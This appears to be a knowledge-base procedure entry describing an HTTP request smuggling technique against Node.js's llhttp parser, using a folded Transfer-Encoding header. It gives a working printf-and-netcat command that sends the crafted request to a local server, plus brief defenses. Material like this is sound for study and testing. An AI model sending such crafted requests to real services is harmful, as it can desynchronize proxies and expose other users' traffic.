---
tags:
  - http-request-smuggling
  - exploit
  - node-js
type: procedure
tools:
  - '[[tools/printf]]'
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/printf-nc-send-crafted-request]]'
platforms:
  - Node.js
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6d6c28fa-ad66-46bd-9510-c6a2b75d1a47
created_at: '2025-12-13T09:01:17.444Z'
updated_at: '2025-12-13T09:01:17.444Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send Crafted HTTP Request with Multi-line Transfer-Encoding

## Summary

This procedure involves crafting and sending an HTTP request with a multi-line Transfer-Encoding header to exploit the parsing vulnerability in Node.js's llhttp parser.

## Description

By using a folded line in the Transfer-Encoding header (e.g., 'chunked' followed by ', identity'), the request triggers incorrect parsing in Node.js, treating it as chunked encoding while a compliant proxy might see it differently. This desynchronization can lead to request smuggling attacks. The procedure uses printf to format the request and nc to send it over TCP.

## Requirements

1. Running Node.js HTTP server on localhost port 80
2. Access to bash or similar shell for executing commands
3. No elevated privileges needed

## Defense

Defensive measures and detection strategies:

- Implement strict header validation in proxies and servers
- Use updated versions of Node.js that fix the obs-fold handling issue

## Objectives

1. Trigger the vulnerability with a specially crafted request
2. Demonstrate potential for desynchronization
3. Prepare for observation of parsing errors

## Instructions

### Step 1: Construct and Send the Request

**Context**: Format the HTTP request with multi-line headers and send it to the server.

**Command** ([[commands/printf-nc-send-crafted-request]]):

```bash
printf "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n , identity\r\n\r\n1\r\na\r\n0\r\n\r\n" | nc localhost 80
```

> This command creates a GET request with the vulnerable header format and pipes it to netcat for transmission to the local server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/printf-nc-send-crafted-request]]

## Tools Used

- [[tools/printf]]
- [[tools/nc]]

## Tags

- [[http-request-smuggling]]
- [[exploit]]
